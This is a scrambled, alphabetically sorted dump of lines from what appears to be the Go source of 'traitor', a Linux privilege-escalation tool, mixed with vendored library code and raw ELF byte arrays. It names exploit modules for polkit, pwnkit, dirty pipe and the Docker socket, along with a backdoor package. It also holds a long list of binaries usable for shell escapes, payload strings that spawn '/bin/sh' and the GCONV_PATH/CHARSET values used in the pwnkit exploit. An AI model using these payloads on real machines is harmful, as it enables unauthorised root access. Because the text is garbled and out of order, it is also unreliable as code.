"  8, 0, 0, 0, 0, 0, 0, 0, 91, 0, 0, 0, 18, 0, 11, 0,"
"  8, 0, 0, 0, 0, 0, 12, 0, 48, 7, 0, 0, 0, 0, 0, 0,"
"  8, 0, 0, 0, 0, 0, 9, 0, 104, 5, 0, 0, 0, 0, 0, 0,"
"  8, 0, 0, 0, 12, 63, 0, 0, 8, 0, 0, 0, 28, 64, 0, 0,"
"  8, 0, 0, 0, 240, 63, 0, 0, 6, 1, 0, 0, 244, 63, 0, 0,"
"  8, 16, 1, 0, 0, 0, 0, 0, 2, 4, 0, 0, 4, 0, 0, 0,"
"  8, 47, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  8, 6, 0, 0, 0, 0, 0, 0, 8, 6, 0, 0, 0, 0, 0, 0,"
"  8, 63, 0, 0, 24, 1, 0, 0, 28, 1, 0, 0, 6, 0, 0, 0,"
"  8, 63, 0, 0, 248, 0, 0, 0, 248, 0, 0, 0, 4, 0, 0, 0,"
"  80, 16, 0, 0, 0, 0, 0, 0, 192, 6, 0, 0, 0, 0, 0, 0,"
"  80, 2, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0,"
"  80, 229, 116, 100, 4, 0, 0, 0, 156, 7, 0, 0, 0, 0, 0, 0,"
"  80, 229, 116, 100, 4, 0, 0, 0, 164, 7, 0, 0, 0, 0, 0, 0,"
"  80, 229, 116, 100, 4, 0, 0, 0, 84, 32, 0, 0, 0, 0, 0, 0,"
"  80, 229, 116, 100, 4, 0, 0, 0, 92, 32, 0, 0, 0, 0, 0, 0,"
"  80, 3, 0, 0, 0, 0, 0, 0, 149, 0, 0, 0, 0, 0, 0, 0,"
"  80, 65, 84, 72, 61, 47, 117, 115, 114, 47, 108, 111, 99, 97, 108, 47,"
"  80, 8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  82, 0, 95, 95, 84, 77, 67, 95, 69, 78, 68, 95, 95, 0, 95, 71,"
"  82, 229, 116, 100, 4, 0, 0, 0, 16, 46, 0, 0, 0, 0, 0, 0,"
"  82, 229, 116, 100, 4, 0, 0, 0, 240, 13, 0, 0, 0, 0, 0, 0,"
"  83, 0, 0, 0, 3, 0, 0, 0, 2, 0, 0, 0, 148, 2, 0, 0,"
"  83, 131, 236, 52, 232, 231, 254, 255, 255, 129, 195, 103, 46, 0, 0, 139,"
"  84, 0, 0, 0, 0, 65, 14, 64, 157, 8, 158, 7, 0, 0, 0, 0,"
"  84, 32, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  84, 32, 0, 0, 0, 0, 0, 0, 36, 0, 0, 0, 0, 0, 0, 0,"
"  84, 32, 0, 0, 0, 0, 0, 0, 84, 32, 0, 0, 0, 0, 0, 0,"
"  84, 32, 0, 0, 44, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  84, 32, 0, 0, 44, 0, 0, 0, 44, 0, 0, 0, 4, 0, 0, 0,"
"  84, 77, 67, 108, 111, 110, 101, 84, 97, 98, 108, 101, 0, 95, 95, 99,"
"  84, 77, 95, 114, 101, 103, 105, 115, 116, 101, 114, 84, 77, 67, 108, 111,"
"  84, 97, 98, 108, 101, 0, 95, 95, 99, 120, 97, 95, 102, 105, 110, 97,"
"  85, 0, 0, 0, 18, 0, 11, 0, 212, 6, 0, 0, 0, 0, 0, 0,"
"  85, 0, 0, 0, 18, 0, 12, 0, 57, 17, 0, 0, 0, 0, 0, 0,"
"  85, 1, 0, 0, 18, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  85, 41, 32, 49, 49, 46, 50, 46, 48, 0, 0, 0, 0, 0, 0, 0,"
"  85, 72, 137, 229, 72, 131, 236, 64, 72, 137, 125, 200, 100, 72, 139, 4,"
"  86, 16, 0, 0, 102, 16, 0, 0, 118, 16, 0, 0, 28, 64, 0, 0,"
"  88, 0, 0, 0, 1, 0, 22, 0, 56, 16, 1, 0, 0, 0, 0, 0,"
"  88, 48, 0, 0, 0, 0, 0, 0, 208, 2, 0, 0, 0, 0, 0, 0,"
"  88, 5, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  88, 5, 0, 0, 0, 0, 0, 0, 24, 0, 0, 0, 0, 0, 0, 0,"
"  88, 8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  9, 0, 0, 0, 0, 0, 0, 0, 24, 0, 0, 0, 0, 0, 0, 0,"
"  92, 32, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  92, 32, 0, 0, 0, 0, 0, 0, 36, 0, 0, 0, 0, 0, 0, 0,"
"  92, 32, 0, 0, 0, 0, 0, 0, 92, 32, 0, 0, 0, 0, 0, 0,"
"  92, 32, 0, 0, 44, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  92, 32, 0, 0, 44, 0, 0, 0, 44, 0, 0, 0, 4, 0, 0, 0,"
"  95, 100, 116, 111, 114, 115, 95, 97, 117, 120, 0, 99, 111, 109, 112, 108,"
"  95, 100, 117, 109, 109, 121, 0, 95, 95, 102, 114, 97, 109, 101, 95, 100,"
"  95, 102, 105, 110, 105, 95, 97, 114, 114, 97, 121, 95, 101, 110, 116, 114,"
"  95, 102, 105, 110, 97, 108, 105, 122, 101, 64, 71, 76, 73, 66, 67, 95,"
"  95, 104, 100, 114, 0, 46, 101, 104, 95, 102, 114, 97, 109, 101, 0, 46,"
"  95, 104, 97, 110, 100, 108, 101, 0, 95, 68, 89, 78, 65, 77, 73, 67,"
"  95, 105, 110, 105, 116, 0, 115, 101, 116, 117, 105, 100, 0, 115, 101, 116,"
"  95, 114, 101, 103, 105, 115, 116, 101, 114, 84, 77, 67, 108, 111, 110, 101,"
"  95, 71, 76, 79, 66, 65, 76, 95, 79, 70, 70, 83, 69, 84, 95, 84,"
"  95, 71, 78, 85, 95, 69, 72, 95, 70, 82, 65, 77, 69, 95, 72, 68,"
"  95, 73, 84, 77, 95, 100, 101, 114, 101, 103, 105, 115, 116, 101, 114, 84,"
"  95, 73, 84, 77, 95, 114, 101, 103, 105, 115, 116, 101, 114, 84, 77, 67,"
"  95, 79, 70, 70, 83, 69, 84, 95, 84, 65, 66, 76, 69, 95, 0, 115,"
"  95, 95, 120, 56, 54, 46, 103, 101, 116, 95, 112, 99, 95, 116, 104, 117,"
"  95, 95, 70, 82, 65, 77, 69, 95, 69, 78, 68, 95, 95, 0, 95, 102,"
"  95, 95, 99, 120, 97, 95, 102, 105, 110, 97, 108, 105, 122, 101, 64, 71,"
"  95, 97, 114, 114, 97, 121, 0, 46, 100, 121, 110, 97, 109, 105, 99, 0,"
"  95, 97, 114, 114, 97, 121, 95, 101, 110, 116, 114, 121, 0, 116, 114, 97,"
"  96, 0, 0, 0, 169, 240, 255, 255, 126, 0, 0, 0, 0, 65, 14, 8,"
"  96, 226, 64, 57, 64, 1, 0, 53, 128, 0, 0, 144, 0, 232, 71, 249,"
"  96, 240, 255, 255, 118, 0, 0, 0, 0, 65, 14, 16, 134, 2, 67, 13,"
"  97, 0, 0, 180, 240, 3, 1, 170, 0, 2, 31, 214, 192, 3, 95, 214,"
"  97, 108, 95, 100, 116, 111, 114, 115, 95, 97, 117, 120, 95, 102, 105, 110,"
"  97, 109, 101, 95, 100, 117, 109, 109, 121, 0, 95, 95, 102, 114, 97, 109,"
"  97, 109, 101, 95, 104, 100, 114, 0, 46, 101, 104, 95, 102, 114, 97, 109,"
"  97, 114, 114, 97, 121, 0, 46, 100, 121, 110, 97, 109, 105, 99, 0, 46,"
"  97, 114, 116, 95, 95, 0, 115, 101, 116, 103, 105, 100, 64, 71, 76, 73,"
"  97, 116, 97, 0, 46, 98, 115, 115, 0, 46, 99, 111, 109, 109, 101, 110,"
"  97, 121, 95, 101, 110, 116, 114, 121, 0, 116, 114, 97, 105, 116, 111, 114,"
"  98, 0, 46, 110, 111, 116, 101, 46, 103, 110, 117, 46, 98, 117, 105, 108,"
"  98, 0, 46, 115, 104, 115, 116, 114, 116, 97, 98, 0, 46, 110, 111, 116,"
"  98, 105, 110, 58, 47, 117, 115, 114, 47, 115, 98, 105, 110, 58, 47, 117,"
"  99, 111, 110, 118, 95, 105, 110, 105, 116, 0, 115, 101, 116, 117, 105, 100,"
"  99, 12, 127, 15, 53, 167, 82, 128, 0, 0, 0, 0, 0, 0, 0, 0,"
"  Short: ""Hugo is a very fast static site generator"","
"  Short: ""Print the version number of Hugo"","
"  Short: ""Try and possibly fail at something"","
"  Short: ""hello"","
"  TraverseChildren: true,"
"  Use:   ""hugo"","
"  Use:   ""try"","
"  Use:   ""version"","
"  Use: ""print [OPTIONS] [COMMANDS]"","
"  [ ""$"
"  __asm__(GOSYM_PREFIX GOPKGPATH "".realSyscall"")"
"  __asm__(GOSYM_PREFIX GOPKGPATH "".realSyscallNoError"")"
"  echo2 ""Build for $os."""
"  execve(args[0], args, environ)"
"  func RawSyscall(trap, a1, a2, a3 uintptr) (r1, r2, err uintptr)"
"  func Syscall(trap, a1, a2, a3 uintptr) (r1, r2, err uintptr)"
"  func Syscall6(trap, a1, a2, a3, a4, a5, a6 uintptr) (r1, r2, err uintptr)"
"  rootCmd.AddCommand(cmdPrint, cmdEcho)"
"  rootCmd.SetArgs([]string{""""})"
"  rootCmd.SetArgs([]string{""sub"", ""arg1"", ""arg2""})"
"  viper.BindPFlag(""author"", rootCmd.PersistentFlags().Lookup(""author""))"
"  },"
" !hasNoOptDefVal(s[2:], flags):"
" !s.IsPackageInstalled(""accountsservice"") {"
" !shortHasNoOptDefVal(arg[1:], c.Flags()):"
" !shortHasNoOptDefVal(s[1:], flags):"
" !strings.Contains(arg, ""="") "
" !strings.Contains(arg, ""=""):"
" !strings.Contains(s, ""="") "
" !strings.Contains(toComplete, ""="") "
" !strings.Contains(useline, ""[flags]"") {"
" !strings.HasPrefix(s, ""-""):"
" "" "" "
" "" """
" "" procedure in "" "
" "" with too many arguments "" "
" ""$"")"
" ""$COMP_WORDBREAKS"" == "
" ""${BASH_VERSINFO[0]:-}"" -gt 3 ]]"
" ""' does not support flag '"" "
" ""'"""
" ""."")"
" "": "" "
" ""="" "
" ""MNT_BITS"" "
" ""NLA_TYPE_MASK"" "
" ""RTF_BITS"" "
" ""WMESGLEN"" "
" ""X86_CR3_PCID_NOFLUSH"" "
" ""]"""
" $3 == """" {next}"
" $Space, ""$($comp.Name)"", 'ParameterValue', ""$($comp.Description)"")"
" ${GOOS}"""
" %v were all set"", flagList, set)"
" (c.Prerelease() != """" "
" (echo2 ""Fail."""
" (name == """" "
" (which comes Windows 10, but"
" (which will be a common case), the default value for the Active Help configuration returned by "
" - there are completions following the activeHelp statements, or"
" // BL R7, R6"
" 1), int(info.Window.Bottom - info.Window.Top "
" 1), nil"
" 1.0.0 (August 24, 2018)"
" 1.1.0 (Jan 07, 2019)"
" 1.12 and later, syscalls via libSystem"
" 1.13 and later, syscalls via libSystem (including syscallPtr)"
" 1.2.0 (April 23, 2019)"
" 1.2.1 (June 17, 2020)"
" 1.3.0 (March 31, 2021)"
" 1.4.0 (January 5, 2022)"
" 10,"
" 2, cap(buf) "
" 7, true"
" <asm/elf.h> contains ELF_ARCH, etc."
" Add a delimiter after the activeHelp statements, but only if:"
" Again, writing regexps to a file."
" Also, we use '> /dev/null 2>"
" Automatically generated shell autocomplete for your application (bash, zsh, fish, powershell)"
" Check if this is an activeHelp statement (i.e., prefixed with $activeHelpMarker)"
" Compiled Object files, Static and Dynamic libs (Shared Objects)"
" DO NOT EDIT."""
" Does not actually test the logic, just the compilation so we make sure we don't break code depending on the lib."
" For Fish, when completing a flag with an = (e.g., <program> -n=<TAB>)"
" For zsh's _describe, we need to use a : instead of a TAB."
" For zsh, when completing a flag with an = (e.g., %[1]s -n=<TAB>)"
" Found an empty line, remove it"
" Found non-empty line, we have our proper output"
" Global, local and cascading flags"
" If docker is not present, stop here."
" If flag parsing is disabled, we may not know all (or any) of the flags, so we fallthrough"
" If flag parsing is enabled, we have completed the flags and can return."
" If requested, completions are returned with a description."
" If shell completion is not already enabled in your environment,"
" If the noun to complete is empty (when the user has not yet typed any letters of that noun), you must pass an empty parameter to the "
" If the user requested inserting one completion at a time, or all"
" If there is a single completion left, remove the description text"
" If there is enough space for any description text,"
" If we want to prevent a space, or if file completion is NOT disabled,"
" In other cases, to support the ""nospace"" directive we trick the shell"
" LOSS OF USE,"
" Might as well do file completion, in case it helps"
" Mutating or ""Normalizing"" Flag names"
" NOTE: Using 1.13 as a base to build the RISCV compiler, the resulting version is based on go1.6."
" Only do this if the program can be found, or else fish may print some errors"
" Out-File -Append -FilePath ""$env:BASH_COMP_DEBUG_FILE"""
" RESOURCE/NAME ...)"","
" Run a single test for an old go version. Would be best with go1.0, but not available on Dockerhub."
" Similarly, the following completion directives are not supported and will be ignored for "
" Since Fish completions are only loaded once the user triggers them, we trigger them ourselves"
" Suggestions when ""unknown command"" happens"
" The PTMGET command allocates a free pseudo terminal, changes its"
" The arguments should be in the form ""ext1"
" The cobra generator may include messages printed to stdout, for example, if the config file is loaded"
" The flexibility to define your own help, usage, etc."
" The master list of authors is in the main Go distribution,"
" The master list of contributors is in the main Go distribution,"
" This machine-generated file defines the system's error numbers,"
" To be consistent with bash and zsh, we only trigger file"
" To do so, we will filter on prefix as the completions we have received"
" To load completions for each session, execute once:"
" To load completions for every new session, run:"
" Usually no arguments are needed, but mkerrors.sh will pass its"
" We must return the result of this command, so it must be the"
" We need to trigger completion from the $CURRENT location, so we need"
" We need to trigger completion from the $CursorPosition location, so we need"
" We need to trigger completion from the $cword location, so we need"
" When completing a flag with an = (e.g., %[1]s -n=<TAB>)"
" Where-Object {$_.Key -eq ""Tab"" }).Function"
" Would also be better to run all the tests, not just one, need to refactor this file to allow for specifc archs per version."
" [ ""${lastChar}"" != ""="" ]"
" [[ ""$GOLANG_SYS_BUILD"" != ""docker"" ]]"
" [[ ""${COMPREPLY[0]}"" == --"
" [[ $(type -t compopt) = ""builtin"" ]] "
" __%[1]s_contains_word ""${words[c]}"" ""${two_word_flags[@]}"""
" __%[1]s_escapeStringWithSpecialChars), ""$($comp.Name)"", 'ParameterValue', ""$($comp.Description)"")"
" __restrict anamelen, int flags)"
" __restrict asa, __socklen_t "
" __restrict from, __socklen_t "
" __restrict name, __socklen_t "
" aiocbp, int nent, const struct timespec "
" and translate them on the way in and out of system calls, but"
" as an alias, the completion algorithm would not know to show the list of"
" attribute. This allows suggestions for strings that are not close in terms of string distance, but makes sense in your set of commands and for some which you don't want aliases. Example:"
" available in bash-completion >= 2, not always present on macOS"
" b2, b1 != 255 "
" bash focuses on the part after the =, so we need to remove"
" basis, without"
" besides,"
" by outputting an extra, longer completion."
" bytes.Equal(b[:6], pasteEnd) {"
" bytes.Equal(b[:6], pasteStart) {"
" can be used for a single cobra command, but not both."
" can't splice.""},"
" capright(0, 0)"
" chars into the string, but there will be a gap at"
" command uses bash completion V2.  If for some reason you need to use bash completion V1, you will need to implement your own "
" command uses bash completion V2.  If you are currently using Cobra's legacy dynamic completion solution, you should not use the default "
" command, Active Help is configurable in the same"
" command, if you want to specify different Active Help configurations, you should use the active help environment variable.  That variable is named "
" command, you can choose to"
" command,"
" compinit"" >> "
" e.Error(),"
" echo2 ""Pass."" "
" environment variable is set to the string ""0"", Cobra will automatically disable all Active Help output (even if some output was specified by the program using the "
" error strings, and signal numbers.  The generator is ""mkerrors.sh""."
" execpromises != """" {"
" f.DefValue == ""0s"""
" filepath.Base(os.Args[0]) != ""cobra.test"" {"
" flag to find potential vulnerabilities, attempting to exploit each, stopping if a root shell is gained. Again, add the "
" flag, as it would have done when calling the "
" flag.ShorthandDeprecated == """" {"
" from, __socklen_t "
" function).  Using ""0"" can simplify your code in situations where you want to blindly disable Active Help without having to call "
" function, where the program repeatedly adds Active Help messages to the list of completions.  Keep reading for details."
" generator,"
" go run mkpost.go > ztypes_$GOOSARCH.go"""
" gofmt -w zsyscall_""$GOOSARCH""_gc.go "" "
" gofmt -w zsyscall_""$GOOSARCH""_gccgo.go "
" gofmt > ""zerrors_windows.go"""
" gofmt > ""zknownfolderids_windows.go"""
" grep 'Version:'"").Output()"
" head -n 1)"""
" however, this is unnecessary as"
" if a command required a flag, and we found it, unset must_have_one_flag()"
" if a go completion function is provided, defer to that function"
" if the zero byte is not present, the program may crash."
" if the zero word is not present, the program may crash."
" if we are looking for a flags value, don't show commands"
" if you bind to variables, they're values."
" if you set a flag which only applies to this command, don't show subcommands"
" illumos implies solaris, so solaris code generation is also required"
" in particular, Set would"
" includes any entity that controls, is"
" int64(rlo), nil"
" ioctl(fd, TIOCGRANTPT, 0)"
" ioctl(fd, TIOCPTSNAME, "
" last command, or else we must store its result to return it."
" leave traces that print directly to stdout in your completion code as they will be interpreted as completion choices by the completion script.  Instead, use the cobra-provided debugging traces functions mentioned above."
" leave traces that print to stdout in your completion code as they will be interpreted as completion choices by the completion script.  Instead, use the cobra-provided debugging traces functions mentioned further above."
" len(buf) == 0 { // GetProcessPreferredUILanguages may return numLanguages==0 with """
" len(strings.Split(entry.Command, "" "")) > 1 {"
" means (a) the power, direct or indirect, to cause"
" missing %v"", flagList, unset)"
" n) // 2 for Family, Len"
" name, int oflag, mode_t mode, struct mq_attr "
" of the following characters: @=/:.,"
" on the target machine, remembering to "
" or a flag's completion function, the program should read the"
" or,"
" ownership to the caller, revokes the access privileges for all previous"
" package, they must be added to the "
" pad ""true"" for bool flag"
" path != """" {"
" path == ""/mnt/term/dev/cons"""
" preOther == """" {"
" prefix (v1.0.0 => 1.0.0), and"
" prefix, etc."
" prototype, and then write a custom wrapper in"
" represent actions, "
" runtime.GOARCH == ""arm64"" {"
" runtime.GOARCH == ""mips64le"" {"
" runtime.GOOS == ""ios"") "
" sh"")"
" solution, the legacy solution will only work for Bash shell-completion and not for other shells. This legacy solution can be used along-side "
" some manual effort, though there are tools that automate"
" special handling and lists ""//sys"" comments giving prototypes"
" statements, and generates the corresponding Go constants."
" strconv.FormatInt(int64(dev), 10)"
" strconv.Itoa(int(n)), nil"
" string(name) == "".."" {"
" strings.HasPrefix(flagName, toComplete) {"
" strings.HasSuffix(completions[0], ""="") {"
" strings.Join(args, "" ""))"
" strings.Join(out, "","") "
" strings.Join(value, """
" strings.Repeat("" "", i) "
" strings.Repeat("" "", i)"
" strings.Replace(l, """
" strings.Replace(t, """
" tee $(tty)"","
" text the user had typed, it is workable enough."
" then echo ""$mkasm $GOARCH"""
" then echo ""$mkerrors "
" then echo ""$mksyscall $syscall_goos "
" then echo ""$mksysctl "
" then echo ""$mksysnum "
" then echo ""$mktypes types_$GOOS.go "
" to ""0"".  In this case "
" to show a list of valid ""nouns"" you have to set them."
" to show"" it returns (""name"", ""a name to show"")."
" uint16(b[1])<<8, b[2:]"
" uint32(b[3])<<24, b[4:]"
" uint64(hi)<<32, b[8:]"
" unlike the first two, it does not call into the scheduler to"
" user.Uid == ""0"" {"
" users, opens the file descriptors for the pty and tty devices and"
" v.Prerelease() == """") {"
" values (ENAMETOOLONG etc.), by asking the preprocessor"
" via a C program,"
" we are parsing a flag and don't have a special handler, no completion"
" we don't have read permissions on, so don't ignore those errors"
" when ""badflag"" is used."
" when the shorthand ""n"" is used."
" will not be set to the value from config,"
" will return ""0"" no matter what the variable "
" will run because the cobra.Command only understood ""kubectl"" and ""get."" "
" will see that the cobra.Command is ""kubectl_get"" and will thus call another helper "
" { echo ""Unable to find KnownFolders.h"" >"
" { echo ""Unable to find ntstatus.h"" >"
" { echo ""Unable to find winerror.h"" >"
"! /bin/sh""},"
"""        "
"""        $Name, $Description = $_.Split("
"""        $RequestComp="
"""    $_ -replace '"
""" $__%[1]s_comp_results)"
""" )"""
""" ./cmd/traitor"
""" = 0 ] "
""" >> ""${BASH_COMP_DEBUG_FILE}"""
""" >> ""${file}"""
""" USING "
""" flag declared as non-bool. Please correct your code"")"
""" in the version."
""" in"
""" or '' does not work!!!"""
""" to pass an empty argument a "
""" },"
"""!/bin/sh"
"""!="": {op: notEqual, f: constraintNotEqual},"
""""", ""127.0.0.1:/dev/null""},"
""""":   {op: equal, f: constraintEqual},"
"""""},"
"""$RequestComp"
"""$word""}"
"""${BASH_REMATCH[1]}"" $(( ""${BASH_REMATCH[2]}"" )) $(( ""${BASH_REMATCH[3]}"" )) $(( ""${BASH_REMATCH[4]}"" )) "
"""${COMMAND}"
"""'""},"
"""': }""},"
""")"","
""")""},"
""").spawn("
""")}"","
""")}""},"
""", """
""", """")"
""", ""-quit""},"
""", id).Scan("
""", time.Second"
""", {stdio: [0, 1, 2]})"
""","", ""--"""
""",2)"""
"""-%s"
"""-%s"" "
"""-%s"""
"""--%[1]s"" "
"""--%[1]s="" "
"""--%s"" "
"""--%s"""
"""-C"","
"""-H"","
"""-o"","
"""."","
"""/"","
"""//go:build %s"
"""/bin"","
"""/bin/sh"
"""/sbin"","
"""/usr/bin"","
""":set shell=/bin/sh"
""":shell"
"""<"":  {op: lessThan, f: constraintLessThan},"
"""<="": {op: lessThanEqual, f: constraintLessThanEqual},"
"""="":  {op: equal, f: constraintEqual},"
""">"":  {op: greaterThan, f: constraintGreaterThan},"
""">="": {op: greaterThanEqual, f: constraintGreaterThanEqual},"
"""AS IS"" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT"
"""BEGIN {system("
"""CALL "
"""CHARSET=HAX"","
"""Command-line flag syntax"" section below."
"""Error parsing version: %s"", err)"
"""GIO_USE_VFS="","
"""PATH=GCONV_PATH=."","
"""PWN"
"""ProxyCommand /bin/sh -i <$(tty) "
"""SHELL=/no/where"","
"""SYSTEM"
"""This implementation"" means the copyrightable works distributed by"
"""]"", """", f.Value, ""  [LP]"")"
"""]"", """", f.Value, ""  [L]"")"
"""]"", """", f.Value, ""  [P]"")"
"""]"", flag.NoOptDefVal)"
"""appendIfNotPresent"":      appendIfNotPresent,"
"""application/x-tar"","
"""apt"","
"""apt-get"","
"""archive/tar"""
"""ash"","
"""awk"","
"""bash"","
"""bg-black"":        """
"""bg-blue"":         """
"""bg-cyan"":         """
"""bg-darkgrey"":     """
"""bg-green"":        """
"""bg-lightblue"":    """
"""bg-lightcyan"":    """
"""bg-lightgreen"":   """
"""bg-lightgrey"":    """
"""bg-lightmagenta"": """
"""bg-lightred"":     """
"""bg-lightyellow"":  """
"""bg-magenta"":      """
"""bg-red"":          """
"""bg-white"":        """
"""bg-yellow"":       """
"""black"":        """
"""blink"":     blink,"
"""blue"":         """
"""bold"":      bold,"
"""bundler"","
"""busctl"","
"""busybox"","
"""byebug"","
"""bytes"""
"""capsh"","
"""changelog"", ""apt"","
"""check_by_ssh"","
"""check_cups"","
"""child_process"
"""context"""
"""cowsay"","
"""cowthink"","
"""cpan"","
"""cpulimit"","
"""crash"","
"""crypto/md5"""
"""crypto/rand"""
"""crypto/sha1"""
"""csh"","
"""cyan"":         """
"""darkgrey"":     """
"""dash"","
"""database/sql/driver"""
"""dim"":       dim,"
"""dmesg"","
"""dpkg"","
"""eb"","
"""ed"","
"""emacs"","
"""encoding/base64"""
"""encoding/binary"""
"""encoding/csv"""
"""encoding/hex"""
"""encoding/json"""
"""env"","
"""eq"":                      Eq,"
"""errors"""
"""ex"","
"""exec "
"""exec sh -i <$(tty) >$(tty) 2>$(tty)"
"""exec sh 0<"
"""expect"","
"""find"","
"""flock"","
"""fmt"""
"""ftp"","
"""gawk"","
"""gcc"","
"""gdb"","
"""gem"","
"""ghc"","
"""ghci"","
"""gimp"","
"""git"","
"""github.com/creack/pty"""
"""github.com/google/uuid"""
"""github.com/hashicorp/go-version"""
"""github.com/inconshreveable/mousetrap"""
"""github.com/liamg/tml"""
"""github.com/liamg/traitor/internal/cmd"""
"""github.com/liamg/traitor/internal/pipe"""
"""github.com/liamg/traitor/internal/version"""
"""github.com/liamg/traitor/pkg/backdoor"""
"""github.com/liamg/traitor/pkg/exploits"""
"""github.com/liamg/traitor/pkg/exploits/cve20213560"""
"""github.com/liamg/traitor/pkg/exploits/cve20214034"""
"""github.com/liamg/traitor/pkg/exploits/cve20220847"""
"""github.com/liamg/traitor/pkg/exploits/dockersock"""
"""github.com/liamg/traitor/pkg/logger"""
"""github.com/liamg/traitor/pkg/payloads"""
"""github.com/liamg/traitor/pkg/random"""
"""github.com/liamg/traitor/pkg/shell"""
"""github.com/liamg/traitor/pkg/state"""
"""github.com/spf13/cobra"""
"""github.com/spf13/pflag"""
"""github.com/spf13/viper"""
"""golang.org/x/crypto/ssh/terminal"""
"""golang.org/x/sys/internal/unsafeheader"""
"""golang.org/x/sys/plan9"""
"""golang.org/x/sys/unix"""
"""golang.org/x/sys/windows"""
"""golang.org/x/term"""
"""green"":        """
"""gt"":                      Gt,"
"""gtester"","
"""hash"""
"""hax.so:."","
"""help"
"""hidden"":    hidden,"
"""hping3"","
"""http://localhost/images/json"","
"""iftop"","
"""import os"
"""initrd"","
"""io"""
"""io/ioutil"""
"""ionice"","
"""irb"","
"""italic"":    italic,"
"""journalctl"","
"""jrunscript"","
"""ksh"","
"""less"","
"""lightblue"":    """
"""lightcyan"":    """
"""lightgreen"":   """
"""lightgrey"":    """
"""lightmagenta"": """
"""lightred"":     """
"""lightyellow"":  """
"""localhost"","
"""logsave"","
"""ltrace"","
"""lua"","
"""magenta"":      """
"""mail"","
"""make"","
"""man"","
"""math/bits"""
"""math/rand"""
"""mawk"","
"""more"","
"""mysql"","
"""nano"","
"""nawk"","
"""net"""
"""net/http"""
"""nice"","
"""nmap"","
"""node"","
"""nohup"","
"""nsenter"","
"""os"""
"""os.execute("
"""os/exec"""
"""os/signal"""
"""os/user"""
"""path"""
"""path/filepath"""
"""pdb"","
"""perl"","
"""pg"","
"""php"","
"""pic"","
"""pico"","
"""pry"","
"""psql"","
"""puppet"","
"""python"","
"""rake"","
"""red"":          """
"""reflect"""
"""regexp"""
"""reset"
"""reverse"":   reverse,"
"""rlwrap"","
"""rpad"":                    rpad,"
"""rpm"","
"""rpmquery"","
"""rsync"","
"""ruby"","
"""run-mailcap"","
"""run-parts"","
"""runtime"""
"""rview"","
"""rvim"","
"""scp"","
"""screen"","
"""script"","
"""sed"","
"""service"","
"""setarch"","
"""sftp"","
"""sh 0<"
"""slsh"","
"""socat"","
"""sort"""
"""split"","
"""sqlite3"","
"""ssh"","
"""start-stop-daemon"","
"""stdbuf"","
"""strace"","
"""strconv"""
"""strings"""
"""sync"""
"""sync/atomic"""
"""syscall"
"""syscall"""
"""system("
"""tar"","
"""taskset"","
"""tclsh"","
"""text/template"""
"""time"""
"""time"","
"""timeout"","
"""tmux"","
"""to request completion choices for the specified command-line."", ShellCompRequestCmd),"
"""trim"":                    strings.TrimSpace,"
"""trimRightSpace"":          trimRightSpace,"
"""trimTrailingWhitespaces"": trimRightSpace,"
"""underline"": underline,"
"""unicode"""
"""unicode/utf16"""
"""unicode/utf8"""
"""unsafe"""
"""unshare"","
"""valgrind"","
"""version"
"""vi"","
"""vim"","
"""vimdiff"","
"""watch"","
"""white"":        """
"""wish"","
"""xargs"","
"""xx"","
"""yellow"":       """
"""zip"","
"""zsh"","
"$ helm __complete status """"<ENTER>"
"$ helm __complete status --output """""
"$(( ""${BASH_REMATCH[5]}"" )) $(( ""${BASH_REMATCH[6]}"" )) $(( ""${BASH_REMATCH[7]}"" )) $(( ""${BASH_REMATCH[8]}"" )) "
"$(( ""${BASH_REMATCH[9]}"" )) $(( ""${BASH_REMATCH[10]}"" )) $(( ""${BASH_REMATCH[11]}"" )) $(( ""${BASH_REMATCH[12]}"" ))"
"$(warning ""could not find golangci-lint in $(PATH), run: curl -sfL https://install.goreleaser.com/github.com/golangci/golangci-lint.sh "
"$(warning ""could not find richgo in $(PATH), run: go get github.com/kyoh86/richgo"")"
"$-2, R3          // Reset last bit of entry point to zero"
"$/ { print """
"$/ {printf("""
"$0, 0(R3)"
"$0, 0(R9)"
"$0, DI"
"$0, R0"
"$0, R10"
"$0, R15          // Move SVC args into registers (entry point still in r0 from SVC 08)"
"$0, R15"
"$0, R3"
"$0, R4"
"$0, R5"
"$0, R6"
"$0, R7"
"$0, R8"
"$0, R9"
"$0, SI"
"$0, addr"
"$0x80000000, R1"
"$1 != """
"$2 == ""ALTWERASE"" "
"$2 == ""BOTHER"" "
"$2 == ""BRKINT"" "
"$2 == ""HID_MAX_DESCRIPTOR_SIZE"" "
"$2 == ""HUPCL"" "
"$2 == ""IBSHIFT"" "
"$2 == ""ICMPV6_FILTER"" "
"$2 == ""IFNAMSIZ"" "
"$2 == ""NAME_MAX"" "
"$2 == ""NFDBITS"" "
"$2 == ""NOKERNINFO"" "
"$2 == ""PENDIN"" "
"$2 == ""SOMAXCONN"" "
"$2 == ""TOSTOP"" "
"$2 == ""XCASE"" "
"$4, R5"
"$cmd docker run --interactive --tty --volume $(cd -- ""$(dirname -- ""$0"")/.."" "
"${char}}""}"
"%[1]s completion zsh > ""${fpath[1]}/_%[1]s"""
"%s"", v.metadata)"
"'$i,"
"(however, for bash, it is only available in the [completion V2 version]("
") is doubled, but only if immediately"
")""), 0777)"
"). If it returns ok=false, the key"
", """", "
", """", """
", Cobra will call your registered "
", Cobra will call your registered function after having parsed all flags and arguments provided in the command-line.  You therefore don't need to do this parsing yourself.  For example, when a user calls "
", Cobra will"
", and the"
", as defined by"
", as long as both solutions are not used for the same command.  This provides a path to gradually migrate from the legacy solution to the new solution."
", c.Root().Name()),"
", command)"
", etc."
", it defaults to "
", like so:"
", name))"
", name, ShellCompNoDescRequestCmd,"
", name, compCmd,"
", name, name, name, name))"
", nameForVar, name, compCmd,"
